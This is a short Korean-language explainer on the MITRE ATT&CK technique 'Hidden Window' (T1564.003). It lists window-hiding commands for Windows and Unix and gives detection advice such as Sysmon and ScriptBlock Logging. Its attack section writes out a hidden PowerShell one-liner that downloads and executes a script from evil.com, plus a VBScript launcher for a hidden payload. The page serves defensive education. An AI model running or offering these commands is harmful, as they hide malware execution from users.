T1564.003: Hidden Window

Defense Evasion

Hidden Window

프로세스의 창을 숨겨 사용자가 악성 활동을 인지하지 못하게 함

#1. 숨겨진 창이란?

"무대 뒤" 비유

연극(프로그램)이 무대 뒤(Hidden Window)에서 공연되어 관객(사용자)에게 보이지 않는 것입니다. PowerShell의 -WindowStyle Hidden, VBScript의 Run 0, Start-Process -WindowStyle Hidden 등을 사용하면 명령 창이 화면에 표시되지 않습니다. 사용자는 작업 관리자를 열어야만 숨겨진 프로세스를 발견할 수 있습니다.

Windows 기법

  • powershell -WindowStyle Hidden
  • VBScript: WScript.Shell.Run cmd, 0
  • Start-Process -WindowStyle Hidden
  • CreateProcess(SW_HIDE)

macOS / Linux

  • nohup command & (백그라운드)
  • osascript -e 'do shell script'
  • screen -dmS session
  • tmux new -d -s session

#2. 공격 기법

# PowerShell Hidden Window
powershell -WindowStyle Hidden -ep bypass -c
"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/beacon.ps1')"
# 화면에 아무것도 표시되지 않음, 작업표시줄에도 안 보임
' VBScript로 숨겨진 CMD 실행
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c powershell -ep bypass -f C:\temp\payload.ps1", 0, False
' 두 번째 인자 0 = Hidden, False = 비동기 실행

방어 방법

  • Sysmon Event ID 1: -WindowStyle Hidden 커맨드라인 탐지
  • ScriptBlock Logging: 숨겨진 창에서 실행된 스크립트 기록
  • ASR 규칙: 의심스러운 프로세스 실행 차단
  • 프로세스 모니터링: 창이 없는 프로세스 식별
